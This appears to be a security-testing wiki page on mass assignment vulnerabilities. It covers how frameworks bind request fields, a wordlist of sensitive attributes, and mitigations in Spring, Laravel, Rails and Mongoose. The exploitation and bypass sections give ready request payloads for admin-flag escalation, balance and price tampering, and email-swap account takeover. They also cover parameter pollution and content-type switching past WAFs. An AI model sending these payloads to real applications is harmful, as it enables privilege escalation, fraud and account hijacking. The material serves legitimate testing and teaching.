---
title: Mass Assignment
---

# Mass Assignment

**Mass Assignment** (also known as Overposting, Autobinding, or Object Injection) is a vulnerability where an application framework automatically binds user-supplied input parameters directly to internal object properties or database models without proper filtering.1 This allows attackers to modify sensitive attributes that should be restricted, such as administrative flags, account balances, or user roles.2

## **Understanding Mass Assignment Basics**

### **Typical Mapping Process**

Frameworks use Object-Relational Mapping (ORM) or "Active Record" patterns to reduce boilerplate code.2

1. **Input**: Client sends data (JSON, XML, or Form-URL-Encoded).
2. **Binding**: The framework iterates through the request keys and matches them to object properties.1
3. **Persistence**: The entire object is saved to the database.

### **Alternative Framework Nomenclature**

| **Language/Framework** | **Terminology** |
| --- | --- |
| Ruby on Rails / Node.js | Mass Assignment1 |
| Java (Spring) / ASP.NET | Autobinding / Overposting1 |
| PHP (Laravel) | Object Injection / Mass Assignment |
|  |  |

## **Common Sensitive Attributes (Wordlist)**

- **Roles/Permissions**: isAdmin, is_admin, role, privileges, permissions, access_level.7
- **Financial/Logic**: balance, credit_balance, cash, points, amount, total_price.9
- **Account State**: verified, status, active, banned, confirmed, account_type.9
- **Internal Metadata**: id, owner_id, created_at, updated_at, tenant_id.3

## **Mass Assignment Attack Surface**

- Registration Forms: Adding isAdmin: true during sign-up.
- Profile Update Pages: Injecting role or email fields to hijack accounts.
- API Endpoints (REST/GraphQL): POST, PUT, and PATCH requests that handle JSON payloads.
- E-commerce Checkouts: Modifying chosen_discount or price parameters.
- Password Reset Flows: Injecting an id or token to override legitimate reset credentials.1

## **Exploiting Mass Assignment**

### **1. Privilege Escalation**

Assume a registration request:

```jsx
POST /api/register

{"username": "attacker", "password": "password123"}
```

**Payloads**:

```jsx
{
"username": "attacker",
"password": "password123",
"isAdmin": true
}
```

Other variations: "role": "admin", "is_administrator": 1, "user_type": "superuser".9

**2. Financial & E-commerce Manipulation**

Targeting balance or discount fields in API responses.

**Original Response** (GET /api/me):

```jsx
{"username": "wiener", "credit_balance": 10}
```

**Attack Payload** (POST /api/update):

```jsx
{
"username": "wiener",
"credit_balance": 99999
}
```

**Discount Hijack Example**:

```jsx
{
"chosen_discount": { "percentage": 100 },
"chosen_products": [{ "product_id": "1", "quantity": 1 }]
}
```

Successfully adding the hidden chosen_discount field allows for free purchases.9

**3. Account Takeover (ATO)**

Modifying identity-linked fields that are not in the UI but exist in the model.

**Payload**:

```jsx
POST /api/user/update

{"first_name": "Attacker", "email": "victim@gmail.com"}
```

If the backend binds the email field, the attacker can then use the "Forgot Password" feature to send a reset link to the modified address.

**Test Cases**

| **Scenario** | **Payload** | **Expected Outcome** |
| --- | --- | --- |
| Bypass Admin | {"isAdmin": true} | Vertical privilege escalation. |
| Update Balance | {"balance": 9999.99} | Artificial funds injection.9 |
| Modify ID | {"id": 100, "user_id": 1} | Horizontal privilege escalation or DoS.8 |
| Price Tampering | {"price": 0.01} | Purchasing luxury items for nominal costs. |
| Status Bypass | {"verified": true} | Bypassing email/KYC verification.9 |

## **Bypasses & Obfuscation**

### **1. HTTP Parameter Pollution (HPP)**

Exploiting how different servers handle duplicate parameters.

**Payload**: POST /update?role=user&role=admin

- ASP.NET: May concatenate as user,admin.
- Ruby on Rails / PHP: May take the last occurrence (admin).

### **2. Content-Type Switching**

Bypassing WAFs that only inspect JSON or URL-encoded data.

Original: Content-Type: application/json Switched: Content-Type: application/xml

```jsx
<User>
<username>attacker</username>
<isAdmin>true</isAdmin>
</User>
```

Frameworks like Spring or .NET may automatically parse the XML into the same object model, ignoring the WAF's JSON-only rules.

**3. Bracket Notation (Nested Objects)**

Targeting deeply nested properties.

**Payloads**:

- user[role]=admin
- user[profile][isAdmin]=true
- {"user": {"permissions": ["all"]}}

**Advanced Attack Scenarios**

1. **Second-Order Mass Assignment** Injecting a hidden parameter that is stored in the database and only "bound" later during a secondary process (e.g., an admin syncing tool or background job).
2. **Blind Logic Exploitation** In situations where the response does not echo values (Blind), use parameters identified from other endpoints (e.g., /api/v1/debug or /api/v1/documentation) to guess fields for the update endpoint.

## **Detection Techniques**

**Manual Detection**

- **Response Analysis**: Perform a GET request on your own profile. Any field in the JSON response (e.g., "internal_role": "user") is a target for a POST or PUT request.4
- **Privilege Comparison**: Use two accounts (Admin vs. User). Observe fields the Admin sends and attempt to replay them with the User account.7
- **Fuzzing**: Use wordlists of common attributes (like admin, status, role) against update endpoints.

**Automated Detection**

- Burp Suite: Use Param Miner to identify hidden parameters or Intruder with wordlists.
- Arjun: Automated parameter discovery for hidden inputs.
- SAST Tools: Tools like Snyk or SonarQube to find insecure patterns like req.body being passed directly to ORM functions.

## **Impact**

- **Full Account Takeover (ATO)**: Hijacking victim accounts without user interaction.10
- **Privilege Escalation**: Gaining administrative control over the application.
- **Financial Fraud**: Modifying prices, balances, or refund statuses.
- **Data Tampering**: Overwriting critical timestamps, logs, or system settings.9

## **Tools**

- Burp Suite: Repeater, Intruder, and Param Miner extension.
- Postman: Manual API payload testing.9
- Arjun: Hidden parameter discovery.
- Snyk Code: Static analysis for vulnerable binding patterns.

## **Mitigation & Prevention**

- > **Data Transfer Objects (DTOs)** The most secure method. Create separate classes for user input that only include safe fields.9 Secure Flow: Request → UserRegistrationDTO (only name/pass) → User Object.9
- > **Explicit Allow-listing (Whitelisting)**
- Java (Spring): @InitBinder with binder.setAllowedFields(["name", "email"]).9
- PHP (Laravel): Define the $fillable array in the Model.
- Ruby on Rails: Use Strong Parameters with params.require(:user).permit(:name, :email).14
- Node.js (Mongoose): Use _.pick(req.body, ['name', 'email']) or schema protection { protect: true }.
- > **Block-listing (Less Secure)**
- ASP.NET Core: Use the [BindNever] or [JsonIgnore] attributes on properties.5
- PHP (Laravel): Define the $guarded array in the Model.

## **Good To Read**

**HackerOne Reports**

- Uber (#99424): Driver could change their name to anything after acceptance via mass assignment.
- Shopify (Stocky): Unrestricted admin account creation via direct POST to /users/create_admin using a hijacked token.14
- GitHub (2012): The classic incident where a researcher added an SSH key to the Rails organization.1

**Bugcrowd Reports**

- ATO via Profile Update: Discussion on modifying email during profile updates to achieve account takeover.12

## **References**

- [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment)
- [https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- [https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)
- [https://learn.snyk.io/lesson/mass-assignment/](https://learn.snyk.io/lesson/mass-assignment/)
- [https://swisskyrepo.github.io/PayloadsAllTheThings/Mass%20Assignment/](https://swisskyrepo.github.io/PayloadsAllTheThings/Mass%20Assignment/)

## **Works cited**

- Mass Assignment - OWASP Cheat Sheet Series, accessed February 20, 2026, [https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- Mass Assignment - Payloads All The Things, accessed February 20, 2026, [https://swisskyrepo.github.io/PayloadsAllTheThings/Mass%20Assignment/](https://swisskyrepo.github.io/PayloadsAllTheThings/Mass%20Assignment/)
- API6:2019 - Mass Assignment - OWASP API Security Top 10, accessed February 20, 2026, [https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/](https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/)
- What is mass assignment? | Tutorial & examples - Snyk Learn, accessed February 20, 2026, [https://learn.snyk.io/lesson/mass-assignment/](https://learn.snyk.io/lesson/mass-assignment/)
- Mass assignment vulnerability - Wikipedia, accessed February 20, 2026, [https://en.wikipedia.org/wiki/Mass_assignment_vulnerability](https://en.wikipedia.org/wiki/Mass_assignment_vulnerability)
- Mass Assignment in .NET | SecureFlag Security Knowledge Base, accessed February 20, 2026, [https://knowledge-base.secureflag.com/vulnerabilities/inadequate_input_validation/mass_assignment__net.html](https://knowledge-base.secureflag.com/vulnerabilities/inadequate_input_validation/mass_assignment__net.html)
- Testing for Mass Assignment - wstg - GitHub, accessed February 20, 2026, [https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment.md](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment.md)
- Testing for Mass Assignment - WSTG - Latest | OWASP Foundation, accessed February 20, 2026, [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment)
- Mass Assignment: When Your API Accepts Too Much Trust | by InstaTunnel | Medium, accessed February 20, 2026, [https://medium.com/@instatunnel/mass-assignment-when-your-api-accepts-too-much-trust-2bd5d675e843](https://medium.com/@instatunnel/mass-assignment-when-your-api-accepts-too-much-trust-2bd5d675e843)
- Mass Assignment: Account Takeovers and Security Risks - DeepStrike, accessed February 20, 2026, [https://deepstrike.io/blog/mass-assignment-techniques](https://deepstrike.io/blog/mass-assignment-techniques)
- Lab: Exploiting a mass assignment vulnerability | Web Security Academy - PortSwigger, accessed February 20, 2026, [https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)
- Access Control vs Account Takeover: What Bug Bounty Hunters Need to Know | @Bugcrowd, accessed February 20, 2026, [https://www.bugcrowd.com/blog/access-control-vs-account-takeover-what-bug-bounty-hunters-need-to-know/](https://www.bugcrowd.com/blog/access-control-vs-account-takeover-what-bug-bounty-hunters-need-to-know/)
- Secure Coding Guidelines | Mass Assignment, accessed February 20, 2026, [https://learn.securecodewarrior.com/secure-coding-guidelines/mass-assignment](https://learn.securecodewarrior.com/secure-coding-guidelines/mass-assignment)
- How to Fix "Mass Assignment" Vulnerabilities - OneUptime, accessed February 20, 2026, [https://oneuptime.com/blog/post/2026-01-24-mass-assignment-vulnerabilities/view](https://oneuptime.com/blog/post/2026-01-24-mass-assignment-vulnerabilities/view)
- How a Privilege Escalation Led to Unrestricted Admin Account ..., accessed February 20, 2026, [https://www.hackerone.com/blog/how-privilege-escalation-led-unrestricted-admin-account-creation-shopify](https://www.hackerone.com/blog/how-privilege-escalation-led-unrestricted-admin-account-creation-shopify)